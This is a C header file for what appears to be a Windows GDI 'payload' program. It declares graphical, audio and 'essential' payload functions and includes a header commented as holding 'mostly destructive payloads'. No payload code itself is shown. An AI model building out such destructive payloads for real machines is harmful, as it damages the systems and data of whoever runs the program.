#pragma once

#define _USE_MATH_DEFINES // math constants
#define WIN32_LEAN_AND_MEAN // don't include unnecessary windows headers
#define _WIN32_WINNT 0x0501 // so that the compiler targets xp

//Libraries

#include <windows.h>
#include <mmsystem.h>
#include <stdbool.h>
#include <ntstatus.h>
#include <math.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <VersionHelpers.h>
#include <shlobj.h>
#include <shlwapi.h>

extern ULONG g_uRngSeed;
extern INT g_iGDIPayloadCount;
extern BOOL g_bDebug;

// Function prototypes
VOID WINAPI fnSetSeedRNG(VOID);
VOID WINAPI fnEssentialpayloads(VOID);
VOID WINAPI fnGraphicalpayloads(VOID);
VOID WINAPI fnAudiopayloads(VOID);
BOOL WINAPI fnAlert(VOID);
VOID WINAPI fnPayloadTimer(VOID);

//Project headers 
#include "audiopayloads.h" //   Audio payloads which utilise MME
#include "miscpayloads.h" //    Mostly destructive payloads
#include "graphicalpayloads.h" //   Graphical payloads
#include "arrays.h" //  Arrays that store strings, etc stuff.